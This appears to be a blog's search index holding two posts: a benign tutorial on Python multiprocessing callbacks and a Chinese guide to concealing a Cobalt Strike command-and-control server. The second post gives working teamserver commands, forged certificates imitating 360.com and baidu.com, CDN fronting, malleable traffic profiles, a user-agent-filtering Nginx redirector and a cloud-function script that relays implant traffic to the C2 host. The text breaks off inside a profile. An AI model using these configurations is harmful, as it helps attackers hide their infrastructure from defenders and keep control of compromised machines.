<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python异步并行回调</title>
      <link href="/2022/02/25/d6c1d8ed.html"/>
      <url>/2022/02/25/d6c1d8ed.html</url>
      
        <content type="html"><![CDATA[<h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>进程&#x2F;线程&#x2F;协程池中一旦有任务执行完成，如何将结果主动告知给主进程？如果子进程单纯地把执行结果丢进缓存或硬盘里，主进程并不知道任务执行状态，只能定时主动通过接口等方法去拉数据查看，未免有些笨拙。</p><p>因此主进程在下发任务时，可以指定一个函数，池子中有任务完成，会主动告知主进程，主进程便调用该函数取子进程return的结果进行处理，此函数就是回调函数。</p><p>以异步非阻塞进程池为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">child</span>(<span class="params">x</span>):                                                </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;子进程<span class="subst">&#123;x&#125;</span> pid: <span class="subst">&#123;os.getpid()&#125;</span> ppid: <span class="subst">&#123;os.getppid()&#125;</span>&quot;</span>) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):                                       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> 执行 <span class="subst">&#123;i&#125;</span>&quot;</span>)                                 </span><br><span class="line">        time.sleep(random.randint(<span class="number">1</span>, <span class="number">3</span>))                     </span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;x&#125;</span> 执行完成&quot;</span>                                       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;callback pid: <span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get result:&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = Pool(<span class="number">3</span>)</span><br><span class="line">    [p.apply_async(func=child, args=(i,), callback=callback) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---start---&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---end---&quot;</span>)</span><br></pre></td></tr></table></figure><p>主进程和三个子进程，四个进程基本上是同时运行的。回调函数由主进程负责执行。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202202272342495.png" alt="image-20220226221445637" style="zoom:50%;" /><h1 id="关于原理"><a href="#关于原理" class="headerlink" title="关于原理"></a>关于原理</h1><p>文档中是这样说明的：<a href="https://docs.python.org/zh-cn/3.9/library/multiprocessing.html?highlight=multiprocessing#multiprocessing.pool.multiprocessing.Pool.apply_async">https://docs.python.org/zh-cn/3.9/library/multiprocessing.html?highlight=multiprocessing#multiprocessing.pool.multiprocessing.Pool.apply_async</a></p><div class="note info flat"><p>如果指定了callback , 它必须是一个接受单个参数的可调用对象。当执行成功时，callback会被用于处理执行后的返回结果，否则，调用error_callback。如果指定了error_callback, 它必须是一个接受单个参数的可调用对象。当目标函数执行失败时， 会将抛出的异常对象作为参数传递给error_callback执行。回调函数应该立即执行完成，否则会阻塞负责处理结果的线程。</p></div><p>既然回调函数是主进程负责，那么若是主进程在apply_async结束时，仍有一堆任务需要执行（比如while）,谁去进行回调？</p><p>其实，在运行apply_async方法时，池子会创建一个新线程result_handler负责回调，并非在主线程中处理。当任务完成，任务执行的结果会推入到队列中，然后调用回调从队列中取结果处理，整个过程是串行执行，这也就是为什么会强调，<mark class="hl-label blue">回调函数应该立即执行完成，否则会阻塞负责处理结果的线程</mark> 。</p><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>在复杂场景中回调函数需要访问其他类或者变量，单纯使用上述简单的回调肯定是不行的，不能传递其他信息。最近在写扫描器，涉及到任务进度条展示问题，需要将任务完成信息回调，再使用websocket与前端交互。</p><p>以上述进程池为例，解决方法：</p><p>1、设置任务状态标记位，并与回调方法封装成类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">call_back</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.schedule = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">self, msg</span>):</span><br><span class="line">        self.schedule += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;callback pid: <span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;get result:&quot;</span>, msg, <span class="string">f&quot;进度：<span class="subst">&#123;self.schedule&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>实例化并调用方法即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">callback = call_back()</span><br><span class="line">[p.apply_async(func=child, args=(i,), callback=callback.callback) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]]</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202202272343614.png" alt="image-20220226221051279" style="zoom:50%;" /><p>2、使用生成器。</p><p>将msg send进回调函数，函数执行到yield语句时暂停，此时生成器现阶段的状态保存到内存，其中包括关键点：局部变量schedule。</p><p>当生成器被再次调用时，直接从上次暂停的yield语句处接着运行，直至遇到下一个yield语句，否则运行结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">call_back_</span>():</span><br><span class="line">    schedule = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = <span class="keyword">yield</span></span><br><span class="line">        schedule += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;callback pid: <span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;get result:&quot;</span>, msg, <span class="string">f&quot;进度：<span class="subst">&#123;schedule&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>在生成器启动前必须调先传一个none进去，而schedule在异步并行过程中也会从1开始累加。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callback_ = call_back_()</span><br><span class="line">callback_.__next__()</span><br><span class="line">[p.apply_async(func=child, args=(i,), callback=callback_.send) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]]</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202202272343323.png" alt="image-20220226220659378" style="zoom:50%;" /><p>3、使用闭包捕获任务状态值。</p><p>存在问题，进度并没有根据任务的执行而累计，讲道理内嵌函数是可以记住嵌套作用域变量值的（闭包的现象）。</p><p>猜测和异步并行有关。当不同进程里任务执行完毕后，回调工厂函数对象多次返回的内嵌函数里的变量schedule是彼此独立的，也就是说并不是指向同一段内存地址，也就无法做到累加。当然把闭包塞到类里是可以的，不过得不偿失没啥用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_call_back</span>():</span><br><span class="line">    schedule = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">msg</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> schedule</span><br><span class="line">        schedule += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;callback pid: <span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;get result:&quot;</span>, msg, <span class="string">f&quot;进度：<span class="subst">&#123;schedule&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> callback</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[p.apply_async(func=child, args=(i,), callback=_call_back()) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]]</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202202272343818.png" alt="image-20220226221006262" style="zoom:50%;" /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>回调函数如果要连续执行多步骤而不仅仅只是输出拿到的结果，关键点在于如何保存和恢复相关的状态信息。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p10_carry_extra_state_with_callback_functions.html">https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p10_carry_extra_state_with_callback_functions.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/22229197">https://zhuanlan.zhihu.com/p/22229197</a></p><p><a href="https://www.zhihu.com/question/34365468">https://www.zhihu.com/question/34365468</a></p><p><a href="https://wenkefendou.gitbooks.io/python3-learning/content/generator_and_yield.html">https://wenkefendou.gitbooks.io/python3-learning/content/generator_and_yield.html</a></p><p><a href="https://stackoverflow.com/questions/24770934/who-runs-the-callback-when-using-apply-async-method-of-a-multiprocessing-pool">https://stackoverflow.com/questions/24770934/who-runs-the-callback-when-using-apply-async-method-of-a-multiprocessing-pool</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 异步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C2隐藏</title>
      <link href="/2021/12/15/e873937.html"/>
      <url>/2021/12/15/e873937.html</url>
      
        <content type="html"><![CDATA[<p>简单记录一下C2对于流量特征以及ip隐藏的基本方法，规避⽹络空间测绘。</p><h1 id="修改端口"><a href="#修改端口" class="headerlink" title="修改端口"></a>修改端口</h1><p>自定义server_port项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br><span class="line">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=xxxx -Djavax.net.ssl.keyStore=./xxxxxxxx.store -Djavax.net.ssl.keyStorePassword=xxxxx -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*</span><br></pre></td></tr></table></figure><h1 id="HTTPS上线-x2F-CDN隐藏"><a href="#HTTPS上线-x2F-CDN隐藏" class="headerlink" title="HTTPS上线&#x2F;CDN隐藏"></a>HTTPS上线&#x2F;CDN隐藏</h1><p>默认证书在端口扫描、censys.io等探测时的特征很明显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112190000177.png" alt="image-20211219000010125"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112190017875.png" alt="image-20211219001717904"></p><p>删除旧证书伪造新证书：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</span><br><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN&quot;</span><br></pre></td></tr></table></figure><p>用上述方法生成的cobaltstrike.store证书只用于服务端和客户端通讯，与https的beacon上线所用的证书并不是同一个，而后者同样具有特征，所以还是自己搞个域名申请证书吧。</p><p>在freenom申请免费域名，把域名解析到cloudflare，申请cloudflare的ssl证书。也可以直接在FreeSSL.cn申请证书，不走CDN。</p><h2 id="域名证书"><a href="#域名证书" class="headerlink" title="域名证书"></a>域名证书</h2><p><strong>cloudflare基本配置</strong>：</p><ul><li>关闭自动https重写、始终使用https、broti压缩三项。</li><li>开启开发模式。</li><li>SSL&#x2F;TLS加密模式为完全（严格）。</li><li>配置页面规则绕过缓存，实时收到执行结果。</li></ul><p>根据malleable文件配置的url格式来决定页面规则怎么写。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112211003993.png" alt="image-20211221100332365"></p><p>申请证书。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112192141771.png" alt="image-20211211125859-bls0ayh"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112192143178.png" alt="image-20211211130212-5h07dqc"></p><p>把这俩证书提前保存下来，server.pem和server.key。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152338377.png" alt="image.png"></p><p>用证书打包生成store秘钥库文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out test.xxxxxxxxxx.p12 -name test.xxxxxxxxxx -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore test.xxxxxxxxxx.store -srckeystore test.xxxxxxxxxx.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias test.xxxxxxxxxx</span><br></pre></td></tr></table></figure><p>把生成的store文件放到CS目录。修改teamserver的store名和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112192153444.png" alt="image-20211219215321066"></p><p>免费版cloudflare支持解析端口：</p><ul><li>http：80、8080、8880、2052、2082、2086、2095</li><li>https：443、2053、2083、2087、2096、8443</li></ul><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112211006317.png" alt="image-20211211200649-0rzpqm7"></p><p>PS：用CDN当中转时，配置的malleable文件需要将所有的头设置为header “Content-Type” “application&#x2F;*; charset&#x3D;utf-8”;否则可能会出现能上线但无法回显命令的情况，估计是CDN解析的问题，试了好几次，有点费解。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112200024861.png" alt="image-20211220002357912"></p><p>不用域前置的时候，还要修改或注释掉里面header “Host”部分（默认是注释掉的），原因参考域前置。</p><h2 id="ip证书"><a href="#ip证书" class="headerlink" title="ip证书"></a>ip证书</h2><p><a href="https://app.zerossl.com/">https://app.zerossl.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112232215187.png" alt="image-20211223221507453"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112232215234.png" alt="image-20211223221519956"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112232215128.png" alt="image-20211223221531572"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112232216308.png" alt="image-20211223221544584"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112232216639.png" alt="image-20211223221629683"></p><p>配置参考：</p><p><a href="https://help.zerossl.com/hc/en-us/articles/360058295094-Before-Installation">https://help.zerossl.com/hc/en-us/articles/360058295094-Before-Installation</a></p><p>需要先合并文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat certificate.crt ca_bundle.crt &gt;&gt; certificate1.crt</span><br></pre></td></tr></table></figure><p>剩下步骤和域名证书一样。</p><h1 id="配置流量混淆文件"><a href="#配置流量混淆文件" class="headerlink" title="配置流量混淆文件"></a>配置流量混淆文件</h1><p>在默认情况下，通过CS默认的url可以访问shellcode，且加密shellcode的密钥是固定的。所以需要自定义malleable配置来改变beacon的通信流量格式，同时用来规避审计。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112211008319.png" alt="image-20211219222654151"></p><p>造轮子：</p><p><a href="https://www.cobaltstrike.com/help-malleable-c2">https://www.cobaltstrike.com/help-malleable-c2</a></p><p>找轮子：</p><p><a href="https://github.com/FortyNorthSecurity/c2concealer">https://github.com/FortyNorthSecurity/c2concealer</a></p><p><a href="https://github.com/xx0hcd/Malleable-c2-Profiles/tree/master/normal">https://github.com/xx0hcd/Malleable-c2-Profiles/tree/master/normal</a></p><p><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a></p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>选定malleable文件检查是否能用，没什么大毛病就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint malleable-c2/jquery-c2.4.0.profile</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112191638068.png" alt="image-20211219163848425"></p><p>后续可以添加自己申请的证书，自定义useragent配合Nginx。同时注意http-config里要开启转发，用来获取出网ip。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;xxxxxxxx.store&quot;;</span><br><span class="line">    set password &quot;xxxxxx&quot;;</span><br><span class="line">    </span><br><span class="line">set useragent &quot;xxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver xxxxxxxx xxxxx malleable-c2/jquery-c2.4.0.profile</span><br></pre></td></tr></table></figure><p>beacon上线后的心跳包已改变。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112191728194.png" alt="image-20211219172757815"></p><h1 id="Nginx反代"><a href="#Nginx反代" class="headerlink" title="Nginx反代"></a>Nginx反代</h1><p>一般都部在C2的上游机器。</p><p>修改nginx.conf，结合malleable里useragent特征配置过滤，返回403或者把流量导向高信誉网站都行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">               listen xxxxx;</span><br><span class="line">               server_name IP;</span><br><span class="line">       # 启动xff转发源ip，防止上线后源ip显示错误</span><br><span class="line">               proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  </span><br><span class="line"></span><br><span class="line">               location ~*/ &#123;</span><br><span class="line">                       if ($http_user_agent != &quot;xxxx&quot;) &#123;</span><br><span class="line">                       return 403;</span><br><span class="line">               &#125;</span><br><span class="line">               proxy_pass  http://localhost:xxxxx;    # 把nginx端口流量转发到xxxx端口</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;   </span><br></pre></td></tr></table></figure><p><strong>http</strong></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112211011207.png" alt="image-20211211212645-lqslpsu"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112211012700.png" alt="image-20211211220743-gsxcwz4"></p><p><strong>https</strong></p><p>需要在&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default文件中启用ssl，指定证书文件server.pem和server.key。然后再在nginx.conf添加配置即可。ip证书和域名证书操作方法相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">listen 443 ssl default_server;</span><br><span class="line">listen [::]:443 ssl default_server;</span><br><span class="line">ssl_certificate    /etc/nginx/ssl/server.pem;</span><br><span class="line">ssl_certificate_key /etc/nginx/ssl/server.key;</span><br><span class="line">ssl_session_timeout 5m;</span><br><span class="line">ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112191953221.png" alt="image-20211219195143351"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152337101.png" alt="image.png"></p><p>配置beacon监听端口只允许本地访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -p tcp --dport 58600 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 58600 -j DROP</span><br></pre></td></tr></table></figure><h1 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h1><p>利用云函数配置流量转发，而且一般云函数服务器都自带CDN，大概流程：</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112172302877.png" alt="image-20211217230031966" style="zoom: 50%;" /><p>操作了一下，个人感觉阿里云函数配置繁琐，还是使用腾讯云吧，毕竟轮子多。</p><p>创建函数。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152339856.png" alt="image.png"></p><p>写入代码并部署。</p><p>PS：C2地址不要加&#x2F;，且协议应该和C2 listener类型一致。</p><p>代码效果：收集beacon请求数据转发给C2 ，收集C2 返回的数据包下发给目标机器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = &#123;&#125;</span><br><span class="line">        path = <span class="literal">None</span></span><br><span class="line">        headers = <span class="literal">None</span></span><br><span class="line">        C2=<span class="string">&#x27;http://IP&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():  </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.headers)</span><br><span class="line">            <span class="built_in">print</span>(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112201557917.png" alt="image-20211220155703926"></p><p>配置触发器。    </p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112201749483.png" alt="image-20211220174855627"></p><p>配置api。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112201901891.png" alt="image-20211220190121072"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152340766.png" alt="image.png"></p><p>下一步，后端超时时间需要稍微大一点，不然马可能来不及走完流程就挂了。而且如果是stager加载的话，向C2请求下载一些大文件也会下载超时。</p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112201907800.png" alt="image-20211220190659277" style="zoom:67%;" /><p>发布服务，记录访问地址，云函数部署完成。</p><p>可惜只支持80、443端口。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202112152341697.png" alt="image.png"></p><p>根据云函数代码新增自定义malleable。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 